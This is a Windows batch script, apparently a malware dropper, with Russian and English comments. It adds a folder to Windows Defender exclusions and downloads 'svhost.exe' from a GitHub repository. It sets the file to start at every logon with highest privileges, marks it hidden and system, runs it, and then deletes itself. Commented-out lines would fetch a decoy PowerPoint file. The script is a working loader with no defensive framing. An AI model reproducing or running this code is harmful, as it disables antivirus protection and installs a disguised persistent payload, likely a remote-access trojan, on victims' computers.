@echo off
setlocal

:: Устанавливаем путь к программе (замените путь на ваш)
set "url=https://github.com/ratS1gma/zlob/raw/refs/heads/main/svhost.exe"
set "outputFileName=svhost.exe"
set "outputFilePath=%USERPROFILE%\AppData\Local\%outputFileName%"

:: Add the Downloads folder to antivirus exclusions (Windows Defender)
echo exclusions
powershell -Command "try { Add-MpPreference -ExclusionPath $env:USERPROFILE\AppData\Local; Write-Host 'Downloads folder successfully added to exclusions.' -ForegroundColor Green } catch { Write-Host 'Failed to add Downloads folder to antivirus exclusions.' -ForegroundColor Red; exit 1 }"

:: Wait briefly to ensure exclusion is registered
timeout /t 1 >nul

:: Download the file
echo Downloading file 
powershell -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile $env:USERPROFILE\AppData\Local\svhost.exe ; Write-Host 'File successfully downloaded to %outputFilePath%' -ForegroundColor Green } catch { Write-Host 'Failed to download the file.' -ForegroundColor Red; exit 1 }"

:: Check if the file exists
if not exist "%outputFilePath%" (
    echo Failed to download the file.
    exit /b 1
)

:: Добавляем задачу в планировщик для автозагрузки
schtasks /create /tn "test_in_autostart" /tr "%outputFilePath%" /sc onlogon /rl highest /f

:: Hidding file
powershell -command "& {attrib +h +s %outputFilePath%}"
:: Run the downloaded file
echo Executing the downloaded file: %outputFilePath%
start "" "%outputFilePath%"

::powershell Invoke-WebRequest -Uri "https://github.com/ratS1gma/zlob/raw/refs/heads/main/bud.pptx" -OutFile "%USERPROFILE%\Downloads\bud.pptx"
::powershell Start-Process -FilePath "%USERPROFILE%\Downloads\bud.pptx"

del "%~f0"

echo done
